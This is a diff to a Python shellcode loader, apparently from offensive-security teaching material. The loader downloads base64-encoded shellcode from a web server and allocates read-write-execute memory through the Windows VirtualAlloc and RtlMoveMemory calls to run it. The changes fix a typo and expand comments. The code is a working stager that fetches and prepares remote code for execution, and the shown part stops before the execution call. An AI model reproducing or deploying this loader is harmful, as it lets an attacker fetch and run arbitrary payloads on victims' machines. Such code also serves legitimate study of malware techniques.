@@ -6,24 +6,25 @@ import ctypes
 kernel32 = ctypes.windll.kernel32
 
 def get_code(url):
-    with request.ourlopen(url) as response:
+    with request.urlopen(url) as response:
         # decode base64-encoded shellcode from web server
         shellcode = base64.decodebytes(response.read())
     return shellcode
 
 def write_memory(buf):
+    '''Writes the buffer into memory'''
     length = len(buf)
 
-    # Set VirtualAlloc return type to be a pointer: 
-    # this ensures the width of the memory address returned
-    # matches the width of RtlMoveMemory
+    # This allows the shellcode to run in 32- or 64-bit Python:
+    #   1. Set the 'VirtualAlloc' return type to be a pointer: this ensures the width of the memory address returned matches the width of 'RtlMoveMemory'
     kernel32.VirtualAlloc.restype   = ctypes.c_void_p
-    # Seta arguments to be two pointers and a size object
+    #   2. Set the arguments 'RtMoveMemory' will receive to be two pointers and one size object
     kernel32.RtlMoveMemory.argtypes = (
         ctypes.c_void_p,
         ctypes.c_void_p,
         ctypes.c_size_t
     )
+
 
     # Allocate the memory and give it permissions to read, write and execute
     ptr = kernel32.VirtualAlloc(None, length, 0x3000, 0x40)
